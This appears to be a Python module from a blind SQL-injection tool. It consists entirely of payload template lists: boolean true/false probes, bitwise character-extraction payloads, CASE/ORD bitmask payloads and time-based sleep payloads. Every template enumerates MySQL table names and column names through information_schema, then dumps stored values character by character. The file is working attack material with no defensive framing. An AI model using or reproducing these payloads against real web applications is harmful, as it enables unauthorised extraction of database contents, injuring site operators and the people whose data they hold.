#!/usr/bin/python3

# Extract payloads
trueFalsePayloads = [
    "' AND 1=1 %23",
    "' AND 1=2 %23"
]

optimisedSQAndingPayload1 = [
    "0' | (SELECT CONV(MID(LPAD(BIN(ASCII(MID(table_name,{pos},1))),8,'0'),1,3),2,10)FROM information_schema.tables where table_schema=database() LIMIT {row},1) #",
    "0' | (SELECT CONV(MID(LPAD(BIN(ASCII(MID(column_name,{pos},1))),8,'0'),1,3),2,10)FROM information_schema.columns where table_name='{tblName}' LIMIT {row},1) #",
    "0' | (SELECT CONV(MID(LPAD(BIN(ASCII(MID({clmName},{pos},1))),8,'0'),1,3),2,10)FROM {tblName} LIMIT {row},1) #"
]
optimisedSQAndingPayload2 = [
    "0' | (SELECT CONV(MID(LPAD(BIN(ASCII(MID(table_name,{pos},1))),8,'0'),4,3),2,10)FROM information_schema.tables where table_schema=database() LIMIT {row},1) #",
    "0' | (SELECT CONV(MID(LPAD(BIN(ASCII(MID(column_name,{pos},1))),8,'0'),4,3),2,10)FROM information_schema.columns where table_name='{tblName}' LIMIT {row},1) #",
    "0' | (SELECT CONV(MID(LPAD(BIN(ASCII(MID({clmName},{pos},1))),8,'0'),4,3),2,10)FROM {tblName} LIMIT {row},1) #"
]
optimisedSQAndingPayload3 = [
    "0' | (SELECT CONV(MID(LPAD(BIN(ASCII(MID(table_name,{pos},1))),8,'0'),7,2),2,10)FROM information_schema.tables where table_schema=database() LIMIT {row},1) #",
    "0' | (SELECT CONV(MID(LPAD(BIN(ASCII(MID(column_name,{pos},1))),8,'0'),7,2),2,10)FROM information_schema.columns where table_name='{tblName}' LIMIT {row},1) #",
    "0' | (SELECT CONV(MID(LPAD(BIN(ASCII(MID({clmName},{pos},1))),8,'0'),7,2),2,10)FROM {tblName} LIMIT {row},1) #"
]

sQLAndingPayload = [
    "' AND (CASE WHEN ORD(SUBSTR(BINARY((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT {row}, 1)), {pos}, 1))%26{x1}={x2} THEN 1 ELSE 0 END) #",
    "' AND (CASE WHEN ORD(SUBSTR(BINARY((SELECT column_name FROM information_schema.columns WHERE table_name='{tblName}' LIMIT {row}, 1)), {pos}, 1))%26{x1}={x2} THEN 1 ELSE 0 END) #",
    "' AND (CASE WHEN ORD(SUBSTR(BINARY((SELECT {clmName} FROM {tblName} LIMIT {row}, 1)), {pos}, 1))%26{x1}={x2} THEN 1 ELSE 0 END) #"
]

sqlTimePayload = [
    "' and (select sleep(2) from dual where ascii(substr((select table_name from information_schema.tables where table_schema=database() limit {row},1), {pos}, 1)) {op} {x}) #",
    "' and (select sleep(2) from dual where ascii(substr((select column_name from information_schema.columns where table_name='{tblName}' limit {row},1), {pos}, 1)) {op} {x}) #",
    "' and (select sleep(2) from dual where ascii(substr((select {clmName} from {tblName} limit {row},1), {pos}, 1)) {op} {x}) #"
]